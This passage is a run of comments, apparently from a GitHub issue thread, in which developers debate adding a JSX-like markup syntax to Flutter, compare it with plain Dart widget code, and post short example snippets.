(We're also experimenting with IDEs that put in [virtual ""closing tag"" comments](https://github.com/Dart-Code/Dart-Code/issues/383#issuecomment-321985929) for you so you can see the structure without having to actually write it.)

> Great so you know that parsing a markup language is trivial compared to parsing an imperative programming language.

My experience is that declarative vs imperative is not the distinction that matters when it comes to determining how easy a language is to parse. (For example, HTML is ""declarative"" but it may be among the most complicated languages to parse that I've ever dealt with.)

> Code readability and simplicity which in turn drives a whole bunch of other benefits.

If this is the main benefit then this is something we can test. We could take a mixture of engineers who are used to writing HTML, React, iOS code, Android code, Flutter, command-line apps, and so on, and present them each with various syntaxes, and ask them to describe what they think the resulting UI would look like. We can then measure which syntax gets the best results. @InMatrix is this something we could look at after the animation work wraps up, maybe?

> can this structure be easily manipulated by other tools like GUI builders interchangebly ?

Yes, in principle at least. It should be relatively straight-forward to mechanically convert Dart expressions to XML or JSON or whatever other structured language one might use. It's just a matter of converting the syntax, the actual information is the same. Personally I wouldn't convert it to a different syntax if I was making a GUI editor, I would just parse it into a data structure in memory straight from Dart.

> You can't do that easily when the programmer goes inside your ""giant nested expressions"" and writes any valid dart code that doesn't follow the structure that the GUI editor is expecting. With a fixed XML structure that is not a problem.

The thing is, you can put exactly the same ""any valid dart code"" in the XML structure as in the Dart expression. They are literally mechanically interchangeable. So I don't really see how using XML helps with this particularly. For example how would you turn this into XML?:

```dart
new ListView.builder(
  padding: new EdgeInsets.all(8.0),
  itemExtent: 20.0,
  itemBuilder: (BuildContext context, int index) {
    return new Text('entry $index');
  },
)
```

> It handles it just fine, you just don't know how to do it.

I meant specifically JSX. I agree that your proposed syntax would be a perfectly valid way to approach the problem."
2830	"I worked on Adobe's Flex SDK, which combined XML markup and ActionScript, for the last couple years that the product existed at Adobe.  I understand the appeal of markup for defining UIs however I can also remember some drawbacks:

- Flex application visuals could be defined in terms of markup and code. As I remember it, code tended to dominate in large real-world apps.  Readability isn't necessarily a benefit for apps defined as a complex hybrids of markup and code.
- The ""Flex Builder"" IDE had to support apps that were defined by  markup and code. This made the IDE difficult to build and maintain. Developers tended to view it as an ActionScript tool.
- Evolving and maintaining the XML ""compiler"" was a significant burden that kept a team of engineers busy full-time.  Keeping the compiler and toolkit in lockstep slowed down the evolution of the overall sdk.

It's been years and I can no longer recall all the details. However my overall impression is that defining UIs with a combination of markup and code is a mixed bag at best."
2831	"> Whether it died isn't the issue, it's why it died. Did it die because it didn't provide a solution that people wanted? Did it die because of implementation issues? Did it die because of patent issues? Was it too early? Too late? I think it's important to learn lessons from past experiences. Why did E4X and E4H fail where JSX has succeeded?

It died because E4X was only implemented in ActionScript which was only used inside Adobe Flash/Flex and Adobe killed the project. Instead Adobe changed direction towards open standards where there is no single source provider with possibility of lock-in and ecosystem implosion.

> What I find interesting is that people who are new to Flutter often ask for two things: a markup language, and animated GIFs. Then three months in, they are still asking for animated GIFs, but not for a markup language. It could be that this is because the markup language isn't actually needed once you're used to writing build methods in Dart. It could be that they still want a markup language but have worked around the omission and so don't think to ask anymore. It's worth figuring out which because otherwise we risk spending effort on something that is the wrong choice (in either direction).

Well, if I asked you for 2 things and you didn't do either in 3 months and there is an alternative to the first thing, I would also only ask you for what is totally impossible to do given your responsiveness and previous delivery performance.

> (We're also experimenting with IDEs that put in virtual ""closing tag"" comments for you so you can see the structure without having to actually write it.)

Kind of funny but it's like putting the XML closing tag that you mentioned before was too verbose.

> If this is the main benefit then this is something we can test. We could take a mixture of engineers who are used to writing HTML, React, iOS code, Android code, Flutter, command-line apps, and so on, and present them each with various syntaxes, and ask them to describe what they think the resulting UI would look like. We can then measure which syntax gets the best results. @InMatrix is this something we could look at after the animation work wraps up, maybe?

Sure you can do that go ahead, I am sure you will find out that ""Once you do React(with JSX) you simply don't go back"". Survey experienced React developers and ask them if they think JSX is bad and it should never had been done. Show your way and ask them if they want to replace JSX with what you have. Before you do that, close the doors and lock up the place because these developers are just going to grab their stuff and sprint for the closest exit.

> The thing is, you can put exactly the same ""any valid dart code"" in the XML structure as in the Dart expression.

Sure, but for the GUI builders that's just a block of bytes that doesn't need to be touched and can be easily skipped. Making it design/code interchangeability practically possible instead of in principle.

```dart
new ListView.builder(
  padding: new EdgeInsets.all(8.0),
  itemExtent: 20.0,
  itemBuilder: (BuildContext context, int index) {
    return new Text('entry $index');
  },
)
``` 

```dart
let style = {
  padding: new EdgeInsets.all(8.0),
  itemExtent: 20.0
};

<ListView.builder style={style}>
  {(context, index) => <Text> entry {index} </Text>}
</ListView.builder>
```
"
2832	"I used Adobe Flex Builder extensibly...

> Developers tended to view it as an ActionScript tool.

Yes, but I often switched from design view to code view and vice-versa.
Starting a screen I would go to design view and use drag/drop to layout widgets and generate first static screen. Then I would add in code and some static data to fill in screen so I could show people something running that looked like production ready stuff. Productivity was incredible. As development progressed, I connected the front end to the back end and the amount of ActionScript code grew and yes it dominated the code overall but even at close to release time, I often used the design view to tweak the UI without having to dig into code. 

> However my overall impression is that defining UIs with a combination of markup and code is a mixed bag at best.

Not in today's world. Imperative languages have evolved in the philosophy of Python and are great for development. Declarative techniques with embedded markup (XML) became mainstream with the advent of React; and JSON became the preferred text based data format.
"
2833	"> E4X was only implemented in ActionScript

E4X was an ECMA standard. Mozilla shipped it for a while, but then removed it (a very unusual move for a browser vendor). Other browser vendors never wanted to implement it. (They've implemented other new ECMA features, though.) With E4H, the browser vendors were never interested in implementing it (though again, they've implemented plenty of other things I've helped invent).

> Well, if I asked you for 2 things and you didn't do either in 3 months and there is an alternative to the first thing, I would also only ask you for what is totally impossible to do given your responsiveness and previous delivery performance.

That's one possible theory. People tend to ask for many other things besides, though, and many of the things they ask for get implemented, and there are workarounds for animated GIFs too, so I'm not sure this fully explains the situation.

> Kind of funny but it's like putting the XML closing tag that you mentioned before was too verbose.

Indeed. This is an optional IDE feature, and one that you don't have to write into the code, which makes a big difference to whether the verbosity is an issue, though.


> ...`ListView`...

How would a GUI editor handle this markup? I don't really understand how to visualise the UI for this."
2834	"This may be a counter argument to this request, and/or maybe some insight's to keep in mind if you want markup. I have strong feelings that adding markup creating some challenges with GWT I'd hate to see another API go through. 

I've seen a couple other frameworks go through this transition regarding with UI building. Markup like this works great for tooling, in so far it's heavenly for the IDE developers. It's easier to separate the responsibilities of who does what. Although I think it can be done better. 

GWT started out this way, building UI's with Java. Then came along UiBinder, where you could build the UI in xml markup, with a specification. Then the tooling, Eclipse Plugin, was able to generate UI's in xml markup. Android is doing it too, no need to belabor the point. So what I saw happen, markup works great for UI IDE developers. But really, markup is a huge huge investment in time and added complexity tooling to transition it to real program. And the tooling is always last to come. So in the mean time, while all that manifests into reality, there are two worlds. Two interesting ways of doing everything. One in the default language and one in markup. So I support GWT today. When I write documentation, I have to write it twice, once for Java and once for UiBinder XML Markup. So the real question, if you want to go down the markup road, I think the question should be asked, is the added complexity worth the journey! 

JSX I think aims to solve other issues where you want to blend together what your doing with HTML and javascript. It really doesn't feel like the added complexity of markup specification suits the needs of writing UI with markup. Especially when you don't really have a document markup language as the target. At least not for the everyday user. 

On a positive note. I like to work on tooling. So I can see a markup language being quite useful. It's much easier to write and modify AST when your using markup.

But then again, if you have enough minds on the job, it doesn't really matter what you do. At the end of the day, if the developer can write his application faster with your api, your going to get traction. But at what cost to the engineering team. 

I think the real question is, how can the UI be built faster. I think tooling could write the dart, skip any middle man markup. And my aim isn't really to say it's not worth it, but really count the cost's on all the fronts if the road is taken!


"
2835	"> E4X was an ECMA standard. Mozilla shipped it for a while, but then removed it (a very unusual move for a browser vendor). Other browser vendors never wanted to implement it.

I would say only Adobe fully championed E4X and had a good following with developers. Browser vendors do add and remove stuff from their browsers all the time; didn't Google remove MathML support?

> That's one possible theory. People tend to ask for many other things besides, though, and many of the things they ask for get implemented, and there are workarounds for animated GIFs too, so I'm not sure this fully explains the situation.

**Here is the thing about React and JSX. Initially I completely dismissed it**, I was in love with Angular and doing massive work with Ember. I tried desperately to convince the team to go with Angular but that didn't go anywhere as others had their eyes on Aurelia. Someone pointed me to React, I read the docs and evaluated and simply said that there was nothing in there that Angular or others couldn't do it. Then last year I worked on a new project and had the chance to try something new so I gave React a try and **you really don't fully appreaciate what React brings to the table until you develop with it for awhile, then it becomes night and day against all other frameworks. It's a mixture of simplicity and expressiveness brought together by JSX.** 

> How would a GUI editor handle this markup? I don't really understand how to visualise the UI for this.

```dart
let style = {
  padding: new EdgeInsets.all(8.0),
  itemExtent: 20.0
};

<ListView.builder style={style}>
  {(context, index) => <Text> entry {index} </Text>}
</ListView.builder>
```

I would represent the \<List.builder> as a rectangle and if its child/children where other widgets I would put rectangles for that inside it.
Since the child in this case is a function, you can simply put a rectangle saying 'uneditable/code' to tell users that this widget is created from code or in this case easily deduce that the function is a shallow wrapper to the <Text> widget and simply present that; I mean a rectangle that says that the function is a shallow function wrapper and inside it the List item widget rectangle (\<Text> in this case).
"
2836	"> But really, markup is a huge huge investment in time and added complexity tooling to transition it to real program.

All I am asking is to add these simple extensions on the Dart compiler so that if developers want to they can write using this XML structure. The old way would continue to work and the amount of work involved to do this is not huge at all. You can actually see how many lines of code it takes the babel.js compiler to do JSX and I am talking hundreds and not thousands of lines (I just checked it).

> And the tooling is always last to come. So in the mean time, while all that manifests into reality, there's two worlds. Two interesting ways of doing everything. One in the default language and one in markup

Sure but React has been like this and that is not an issue at all.

> When I write documentation, I have to write it twice, once for Java and once for UiBinder XML Markup.

Not in React because markup lives inside code.

> is the added complexity worth the journey!

Absolutely, it's like the argument of whether you should train your developers with the latest techniques and risk them leaving your company. The bigger risk is keeping them around untrained. So you must adopt the latest techniques out there or risk being left behind.

React is leading the journey with the latest techniques to develop UI/UX. It has tremendous traction with developers. Your greatest risk is not meeting the React bar.

> JSX I think aims to solve other issues where you want to blend together what your doing with HTML and javascript

JSX is not just for HTML, React Native generates Views (like Flutter Widgets) from the XML markup.

> I think the real question is, how can the UI be built faster.

More like how UI/UX can be built better. Better meaning: faster, higher quality (code and UI/UX), smooth designer-developer interaction, etc.

By the way, really nice job done on the developer tools; 'flutter doctor' was awesome !!!
I am now cooking with gas and can be dangerously creative ;)

"
2837	"I just wanted to respond to the readability question raised here, though I understand readability is only one of the many factors we need to consider. 

>> Code readability and simplicity which in turn drives a whole bunch of other benefits.

> If this is the main benefit then this is something we can test. We could take a mixture of engineers who are used to writing HTML, React, iOS code, Android code, Flutter, command-line apps, and so on, and present them each with various syntaxes, and ask them to describe what they think the resulting UI would look like. We can then measure which syntax gets the best results. @InMatrix is this something we could look at after the animation work wraps up, maybe?

There are certainly ways to empirically study code readability, and we can have a more serious discussion when it's time for Q4 planning. To make such a study useful, we need to define what kinds of reading tasks are important to developers in the context of Flutter programming. In addition to reading a whole build method and picture what the resulting UI might be, readability also affects smaller tasks such as identifying the build method in a dart file, matching braces, reading inline comments, etc. 

To support some of those more narrowly-scoped tasks, we can experiment with UI enhancements in the editor first, which is usually cheaper than introducing and maintaining a markup language. The closing label feature in VS code is one of such UI enhancements, and we should understand how well it solves the brace matching problem it sets out to address. There are plenty of other options in this space we haven't tried yet. For example, a different font or background color might be used to display the build method to help the developer mentally separate it from the rest of their code.

Another thing that strikes me as important is how we can encourage people to not write giant build method and take advantage of the composition nature of the framework. If the build method is taller than the height of your screen, it's going to be hard to read regardless it's Dart or XML. "
2838	"> Another thing that strikes me as important is how we can encourage people to not write giant build method and take advantage of the composition nature of the framework. If the build method is taller than the height of your screen, it's going to be hard to read regardless it's Dart or XML.

It's not just the build method. It's all other methods that the build method calls to build the widget tree. Very common in React to use smaller methods to build sub-tree pieces and then call those into the larger tree. 

Also in WebStorm with JSX, each XML node has +/- that can be used to expand/collapse node and children to make reading structures larger than the height of the screen easier.
"
2839	One thing we've found in Flutter is that big build methods are not great for performance, and we try to encourage people to break down their build methods into smaller reusable widgets. In particular, in Flutter having a build method that's built out of the results of other methods is somewhat of an antipattern that we'd rather discourage rather than make easier. (This is somewhat of a recent realisation so a lot of our examples and widgets don't do this well yet.)
2840	"> we try to encourage people to break down their build methods into smaller reusable widgets.

Does it really become a reusable widget or simply a wrapper/composite widget? I mean to be reusable you should have at least 2 usage instances. 

The AppBar on https://flutter.io/catalog/samples/basic-app-bar/ is so unique that you can't really call it an reusable component; it's a wrapper/composite component and in these cases why not just use a local method to build that part of the UI? I guess if it did more things it would make sense to place it in a wrapper/composite component.

> One thing we've found in Flutter is that big build methods are not great for performance

Since you mentioned performance, having the animation loop drive the build method will cause performance problems for smooth animation. You don't want your build method called 60 times a second or more, specially considering that the build method is user code (for example, it could have a super long loop that takes forever and it would cause animations to skip). Being a Flutter beginner perhaps I got that wrong.
"
2841	"> The AppBar on https://flutter.io/catalog/samples/basic-app-bar/ is so unique that you can't really call it an reusable component

It's also relatively small, so that's ok.

Regarding performance, this is somewhat off-topic for this issue so please file a new issue if you want to discuss it (or e-mail flutter-dev or post on stack overflow, whatever you prefer)."
2842	https://github.com/Kotlin/anko/wiki/Anko-Layouts
2843	"It's crazy to see this issue getting buried. In my opinion it's going to be a make or break for Flutter to implement JSX-like syntax for composing widgets.

I simply don't understand the target audience, many ios and android devs are moving to react native, it would seem to be the perfect opportunity to harvest market share.

I encourage people involved to give react native a spin and see what we are talking about."
2844	I don't miss JSX a bit in Flutter. This would only bloat the framework and tools for a few small gains here and there.
2845	"@birkir I am 100% with you on this issue. Lack of JSX, which is a perfect fit for Flutter, makes Flutter look old and rusty, feels like 1990s technology. Actually it seems like everyone, in one way or another, is adopting JSX; the latest one being the popular Vue.js framework.
 "
2846	+1
2847	@zoechi What is your previous experience with JSX, have you really used it or just looked at it? I think you guys are underestimating JSX by saying it will give small gains here and there. If you don't have any users, you don't have a product.
2848	"@birkir I see lots of excitement about JSX here but nobody seems to bother to explain what exactly Flutter would gain from having such a DSL, except perhaps some better readability which is mostly subjective.

More features usually only hog down a framework instead of improving it.
Implementing them also consumes lots of resources that are missing from other areas where missing features actually prevent people from implementing certain applications.

So if you are excited about Flutter getting something like JSX, you should invest you time and energy in writing up convincing arguments.
Just adding something because others have it too, is probably the weakest argument there is.

There are also plans to improve Dart to make writing Flutter UI code less verbose which weakens the case for JSX even more.

So what are your convincing arguments?"
2849	"Really !!! ""nobody seems to bother to explain what exactly Flutter would gain... blah blah blah"". 
Haven't you read this thread fully? Is your attention span greater than your JSX knowledge?

You guys are suffering from NIH syndrome (Not-invented-here). ""Good artists copy; great artists steal"", mediocre artists, well, behave like you. 

Just the fact that supporting JSX is relatively simple, and it will tremendously help attract new customers (React Native mobile developers) to the platform, makes it a no-brainer which you guys fail to see. It doesn't bold well for the platform."
2850	Can we please keep a constructive tone when debating.
2851	"Adding features because others have it is weak argument. Okay.
Why does flutter have hot reloading? Where did that come from? Jesus dude.

How did we fail to provide solid argument for you guys? **Project traction and attracting developers** is our number one reason.

Reason number two, **readability**:

https://github.com/flutter/flutter/blob/master/examples/flutter_gallery/lib/demo/cupertino/cupertino_buttons_demo.dart vs https://gist.github.com/birkir/e921158239c324ab95bb0b174383a562

Reason number three, **GUI Builders**. I'll quote the first line in the README.

> A new mobile app SDK to help developers and **designers** build modern mobile apps for iOS and Android.

I would hate to see Flutter going down the same rabbithole as Polymer before it even reaches beta."
2852	"> Project traction and attracting developers

The relation is still unclear.

> Reason number two, readability:

Making Dart code more readable seems a better goal to me

> Reason number three, GUI Builders. I'll quote the first line in the README.

As far as I remember it was mentioned above already that there is no reason why using Dart code would prevent that."
2853	"Your counter arguments can't really dismiss the idea, can they?

1. Relation is pretty clear. Unless it's not a goal for the project to be popular?
2. Great! Will it be close to JSX readability? What is the current proposal for such a thing?
3. It was stated that it **could be done**. Adapting JSX support for currently available GUI builders will be far much simpler."
2854	"> There are also plans to improve Dart to make writing Flutter UI code less verbose

Nice to see acknowledgement that the current way could use some improvements.
Please do provide details on such proposal. Your best bet is to interact with the React Native community for feedback. "
2855	"Several Dart language feature requests could make code more short/readable:

 - [Optional `new` and `const` for Dart 2](https://github.com/dart-lang/sdk/issues/30921)
 - [Meta-issue for discussion of the proposal to allow named arguments everywhere](https://github.com/dart-lang/sdk/issues/30353) - - this could allow widget with `child` argument to skip named argument.
- [Variable Number of Arguments](https://github.com/dart-lang/sdk/issues/16253) - this could allow widgets with `children` argument (like Row and Column) to skip this named argument and its list declaration.

With those changes code could looks like:

```dart
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Cupertino Buttons')),
      body: Column(
        Padding(padding: EdgeInsets.all(16.0),
          Text(
            'iOS themed buttons are flat. They can have borders or backgrounds but '
            'only when necessary.'
          ),
        ),
        Expanded(
          Column(mainAxisAlignment: MainAxisAlignment.center,
            Text(_pressedCount > 0
                   ? 'Button pressed $_pressedCount time${_pressedCount == 1 ? """" : ""s""}'
                   : ' '),
            Padding(padding: EdgeInsets.all(12.0)),
            Align(alignment: Alignment(0.0, -0.2),
              Row(mainAxisSize: MainAxisSize.min,
                CupertinoButton(onPressed: () { setState(() { _pressedCount += 1; }); },
                  Text('Cupertino Button'),
                ),
                CupertinoButton(onPressed: null,
                  Text('Disabled'),
                ),
              ),
            ),
            Padding(padding: EdgeInsets.all(12.0)),
            CupertinoButton(
              color: CupertinoColors.activeBlue,
              onPressed: () { setState(() { _pressedCount += 1; }); },
              Text('With Background'),
            ),
            Padding(padding: EdgeInsets.all(12.0)),
            CupertinoButton(
              color: CupertinoColors.activeBlue,
              onPressed: null,
              Text('Disabled'),
            )
          ),
        ),
      )
    );
  }
```

Moreover depending on your IDE you can optionnaly have synthetic comments at the end of parenthesis and you could see something like this in your IDE:


```dart
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text('Cupertino Buttons')),
      body: Column(
        Padding(padding: EdgeInsets.all(16.0),
          Text(
            'iOS themed buttons are flat. They can have borders or backgrounds but '
            'only when necessary.'
          ),
        ),
        Expanded(
          Column(mainAxisAlignment: MainAxisAlignment.center,
            Text(_pressedCount > 0
                   ? 'Button pressed $_pressedCount time${_pressedCount == 1 ? """" : ""s""}'
                   : ' '), // Text
            Padding(padding: EdgeInsets.all(12.0)),
            Align(alignment: Alignment(0.0, -0.2),
              Row(mainAxisSize: MainAxisSize.min,
                CupertinoButton(onPressed: () { setState(() { _pressedCount += 1; }); },
                  Text('Cupertino Button'),
                ), // CupertinoButton
                CupertinoButton(onPressed: null,
                  Text('Disabled'),
                ), // CupertinoButton
              ), // Row
            ), // Align
            Padding(padding: EdgeInsets.all(12.0)),
            CupertinoButton(
              color: CupertinoColors.activeBlue,
              onPressed: () { setState(() { _pressedCount += 1; }); },
              Text('With Background'),
            ), // CupertinoButton
            Padding(padding: EdgeInsets.all(12.0)),
            CupertinoButton(
              color: CupertinoColors.activeBlue,
              onPressed: null,
              Text('Disabled'),
            ), // CupertinoButton
          ), // Column
        ), // Expanded
      ), // Column
    ); // Scafold
  }
```
"
2856	"This conversation is getting heated. I would like to encourage everyone to read our code of conduct:
https://flutter.io/design-principles/#conflict-resolution
I'm going to close this conversation for a few days while everyone considers how they can respectfully and productively contribute."
2857	"We all know that the syntax for building UI is a very important part of mobile development experience. For now the syntax is a little verbose, I have to `new` something just for the purpose of adding a margin: `margin: new EdgeInsets.symmetric(horizontal: 4.0)`, I think there may be an easier way.

Would it be possible to build a DSL like what the Kotlin team did for Android developers? It's called [Anko](https://github.com/Kotlin/anko/wiki/Anko-Layouts#basics), a DSL for building Android UI:
```kotlin
verticalLayout {
  padding = dip(30)
  editText {
    hint = ""Name""
    textSize = 24f
  }
  button(""Login"") {
    textSize = 26f
  }
}
```

A concise syntax helps to keep the code readable & maintainable, can also make the building work enjoyable, it does matter. Please Flutter team estimate it seriously before you make the decision. We all love to see Flutter make a bigger success in the coming years."
2858	"**Please dont introduce XML-like syntax to Flutter.**

I programmed in Android Java for more than a year, then I started looking for a cross-platform toolset to try.
I started with React Native and then tried React. I didnt really like the JSX syntax because it is not quite javascript and not quite html, so just another thing to learn.
When I tried Flutter I found it much easier to get started (probably mainly due to my Java background).

I think some of the reasons why I wouldnt like to see an XML-syntax added to flutter :
1. Another thing to learn - could be spent learn Futures instead ;P
2. Context-switching - you are context switching between XML and code which is just unnecessary cognitive load.
3. There have been days when I have programmed in Java in the morning and Python in the afternoon. With React you may need to understand Javascript, Babel, JSX, HTML, CSS and more in one codebase. 
4. The reason why XML is not necessary in Flutter is because dart has named arguments which replace XML attributes pretty well.
5. Dart has the very cool dartfmt which indents the code really well for no effort.
#### Comparing to Android

6. You have to learn the programmatic way anyway, why add another way of doing things?
7. The XML layout in android is faster to display changes on the device, but running in Flutter is practically instant anyway so adding XML wouldnt provide that advantage.
8. The Android XML + programmatic combination adds complexity, such as inflating XML snippets and injecting into the XML tree programmatically.
9. Instant run is so fast in Flutter you dont need the XML model to help visualize how it will appear, you can just press a key and see the change immediately.
10. The errors from programmatic layout issues are different from layout issues in XML, so thats two sets of things you need to understand.

I would go one step further and remove pubspec.yaml and replace it with pubspec.dart and have configuration in dart code.

"
2859	"If Devs are complaining about the difficulty of laying out the pages visually - an idea would be to create a layout designer which lets you set your themes and design pages visually by drag-and-drop. Then it would generate Flutter code which is not intended to ever be editted - but rather creates classes which can be used to compose your app.

It wouldnt need to be 2-way editing (XML/layout) like Android XML, but you just save your layout for later. If you need to change it you can regenerate the code and (hopefully) just change some arguments.

"
2860	"I know this conversation is old and yes it was getting quite hot, But i will like to drop a few lines to what i consider is happening here. 

Flutter is NEW. Its a completely NEW way to do things. Yes, it did borrow from the react paradigm. But doesn't mean it needs to follow its same steps. I don't think its the flutter's team objective to attract developers from react native to come to flutter, its only to build something new that developers might find interest in. Google uses it internally before sharing it with the world and they have been productive with it. I share the comments with @Hixie that its not any different from JSX to build the UI. Yes its a little more verbose to right pure dart. But it actually makes debugging your code a lot easier. 

The reason why im against a markup language or JSX or anything that sits on top of a technology is that it require tons more work from the platform. You can be happy composing Markup language for a UI, but you will have so many developers working on the platform crying and pulling hairs out to make it work for you. Another point of view is that JSX Worked for a Javascript community, Where as always its main objective is to make things easier for the developer and not worry about the tradeoffs. Don't get me wrong React(JSX) for web was a match made in heaven because HTML Is markup anyway. But for React Native look at all the code in the repository they had to do to make it work. Adding JSX to flutter would require tons of work and 2 things to think of when adding new features. And again just to be able to remove the child parameter and the const and new Keywords?. I prefer knowing what is really happening in the code and have control over what is happening than have magical Syntax that all its doing is add overhead. 

Well that is my opinion. Don't want to start a new gigantic discussion. Just to mention the fact that JSX Is awesome for a react/javascript community because it worked for them, but for Dart/flutter i  find it a bit overkill to add JSX Just to attract developers from React Native.

Wow, could have written a blog post xD"
2861	"@Rockvole ,

> Another thing to learn - could be spent learn Futures instead ;P

The thing to learn makes the current recursive object construction monstrosity simpler and familiar to everyday React Native devs, so my guess is people will prefer to learn that.

> Context-switching - you are context switching between XML and code which is just unnecessary cognitive load.

Not an issue, there is no context-switch, it is just part of the environment that makes programming UI/UX cleaner.

> Then it would generate Flutter code which is not intended to ever be editted

Why not? Not very useful then.


"
2862	"@franzsilva 

> I don't think its the flutter's team objective to attract developers from react native to come to flutter

Really !!! React Native is dominating and given that the total number of mobile devs using cross platform tools is limited, do you really think Flutter can become a home run hit without attracting React Native people?

> Yes its a little more verbose to right pure dart. But it actually makes debugging your code a lot easier.

That's not a correct statement. Debugging JSX code, which is just javascript code is not any easier or harder, it is the same.

> The reason why im against a markup language or JSX or anything that sits on top of a technology is that it require tons more work from the platform. 

Who cares how much work was placed in the platform? Devs just want the latest techniques that improve code readability and productivity. No dev wants to use old and obsolete techniques when newer stuff provides better alternative.

>  I prefer knowing what is really happening in the code and have control over what is happening than have magical Syntax that all its doing is add overhead.

This is non-sense, I know exactly what goes on with JSX, it is a tiny little layer that transforms almost one to one but provides lots of benefits.  Negligible compile time overhead if you ask me.

> Just to mention the fact that JSX Is awesome for a react/javascript community because it worked for them, but for Dart/flutter i find it a bit overkill to add JSX Just to attract developers from React Native.

JSX should also work great for Dart/Flutter. It is not an overkill by any means. Is there any good reason why JSX would not work for Dart/Flutter? If I were to code it up and released it, why would it not be a good fit for Dart/Flutter development?


 


  
"
2863	"Let's take the concrete example from @xinthink:
> For now the syntax is a little verbose, I have to `new` something just for the purpose of adding a margin: `margin: new EdgeInsets.symmetric(horizontal: 4.0)`, I think there may be an easier way.

If you want to add a margin on the left and right, how would you like to express that? Specifically, let us take a simple example, and see what it would look like in various syntaxes.

```dart
  // Flutter as written today
  return new Container(
    margin: new EdgeInsets.symmetric(horizontal: 4.0),
    decoration: new ShapeDecoration(shape: new CircleBorder(), color: Colors.blue[100]),
    child: new AnimatedCrossFade(
      duration: const Duration(seconds: 3),
      firstChild: const FlutterLogo(style: FlutterLogoStyle.horizontal, size: 100.0),
      secondChild: const FlutterLogo(style: FlutterLogoStyle.stacked, size: 100.0),
      crossFadeState: _showHorizontal ? CrossFadeState.showFirst : CrossFadeState.showSecond,
    ),
  );
```

```dart
  // Flutter as written later this year once we remove ""new"" and ""const"" keywords
  return Container(
    margin: EdgeInsets.symmetric(horizontal: 4.0),
    decoration: ShapeDecoration(shape: CircleBorder(), color: Colors.blue[100]),
    child: AnimatedCrossFade(
      duration: Duration(seconds: 3),
      firstChild: FlutterLogo(style: FlutterLogoStyle.horizontal, size: 100.0),
      secondChild: FlutterLogo(style: FlutterLogoStyle.stacked, size: 100.0),
      crossFadeState: _showHorizontal ? CrossFadeState.showFirst : CrossFadeState.showSecond,
    ),
  );
```

How would you recommend we express these _exact_ semantics?"
2864	"```dart
  // Remove ""new"" and ""const"", infer the class for enum values, allow int literals for doubles
  return Container(
    margin: EdgeInsets.symmetric(horizontal: 4),
    decoration: ShapeDecoration(shape: CircleBorder(), color: Colors.blue[100]),
    child: AnimatedCrossFade(
      duration: Duration(seconds: 3),
      firstChild: FlutterLogo(style: horizontal, size: 100),
      secondChild: FlutterLogo(style: stacked, size: 100),
      crossFadeState: _showHorizontal ? showFirst : showSecond,
    ),
  );
```"
2865	"Babel.js has this neat little website, where you can type JSX and it converts it to plain Javascript:
https://babeljs.io/repl/#?babili=false&evaluate=true&lineWrap=false&presets=es2015%2Creact%2Cstage-0&code=function%20hello()%20%7B%0A%20%20return%20%3Cdiv%3EHello%20world!%3C%2Fdiv%3E%3B%0A%7D

I will do an equivalent one for DSX to Dart. Just a proof of concept, let's see how long it takes me..."
2866	"Here’s @Hixie’s latest example in ”DSX“, using Airbnb’s [style guide](https://github.com/airbnb/javascript/tree/master/react) and assuming all child elements can automagically map to `child` properties.
```jsx
return (
  <Container
    margin={EdgeInsets.symmetric(horizontal: 4)}
    decoration={ShapeDecoration(shape: CircleBorder(), color: Colors.blue[100])}
  >
    <AnimatedCrossFade
        duration={Duration(seconds: 3)}
        crossFadeState={_showHorizontal ? showFirst : showSecond}
    >
      <FlutterLogo style={horizontal} size={100} />
      <FlutterLogo style={stacked} size={100} />
    </AnimatedCrossFade>
  </Container>
);
```
If the intention is to improve readability, I think future Dart wins in spades.

You have to check documentation to know what can turn into tags (presumably `Widget`s only), or how many child elements are required/allowed.

If your goal is to output HTML from JavaScript, JSX makes a ton of sense as a middle ground. Because when you want tags at the end of the day, `React.createElement('div', null, 'foo')` is far worse than `<div>foo</div>`.

If your goal is to output a tree of Dart objects from... Dart, and a nicely formatted tree of Dart constructors is perfectly (arguably more) readable, I don’t see a point in detouring through XML. And I’m not missing those XMLs coming from Android."
2867	It's what using XML enables... Look it's been 5 months with just talk, now I am doing something about it so give me some time (I do have a full time job and can only spare about 4 hours on weekends).
2868	"Just found this thread, interesting on both sides. As a React developer interested in Flutter there are a couple other arguments that I haven't seen mentioned (though I did only briefly skim all the comments.)

1. Closing tag declaration increases understanding of children vs properties. UI can unfortunately be deeply nested, and having a clear </item> tag vs an unknown ) helps to clarify and parse children. It also allows me to move code around between components and very declaratively see when something it out of place (a closing </list> tag before a </listitem> for example.) This is trickier with multiple nested )'s.

2. My initial gut reaction to seeing multiple nested components inside constructors gives me flashbacks to [""callback hell""](http://callbackhell.com/). It was a very painful era of JS that is starting to get better, going back to it feels a bit like a step backwards. 

3. Related to #2, the unfortunate fact is we have to convince people to switch (or at least try it out). Many people are using React/React Native and even more using HTML/JS. Creating a simple and mostly syntactically familiar tutorial/guide that specifically targets some of React's pain points might be extremely compelling to those who are a tad bit fatigued."
2869	"One of the main reasons why React became popular in the Web Developers community was the support of JSX.

It's truly disappointing to see ""down votes"" on such a nice feature request. It improves readability and expedites adoption.

I think this is a major difference between Open JavaScript and Dart. JavaScript is truly open source whereas a request on Dart gets into conversation like this and ultimately you're demotivated with down-votes.

Make more room for new ideas!"
2870	@jayjun That looks amazing! Can I try it somewhere?
2871	"@sanketsahusoft Don't worry pretty soon you will be able to try my version and it is even better than @jayjun. 

Quick update: 2 weekends ago I got the UI working great, Last weekend I got the parser fully working and half of the transpiler working. This coming weekend I hope to finish it off if I avoid the Superbowl ;)

I have thick skin and mule like stubbornness so I don't even notice these down-votes, thanks for pointing them out though.

Carlos.
"
2872	"Would this help with the issue of losing track of closing tags ?
[Idea: Auto generated closing tags](https://github.com/flutter/flutter/issues/14419)"
2873	"Here's some proposed markup syntax for @Hixie 's example:

```
<Container margin=<EdgeInsets.symmetric horizontal=4 />
           decoration=<ShapeDecoration shape=<CircleBorder> color={{ Colors.blue[100] }} />>
    <AnimatedCrossFade duration=<Duration seconds=3 />
                       crossFadeState={{ _showHorizontal ? showFirst : showSecond }}>
      <FlutterLogo style=horizontal size=100 />
      <FlutterLogo style=stacked size=100 />
    </AnimatedCrossFade>
</Container>
```"
2874	"@abarth, the interesting thing you did was add a 3rd attrib possibility that simplifies the look of expressions when they are another tag.
JSX has:
1 - `<tag attrib=""""/>` or `<tag attrib=''/>`
2 - `<tag attrib={}/>`
You suggested another one:
3 - `<tag attrib=<anotherTag.../>/>`
with JSX you have to write it as:
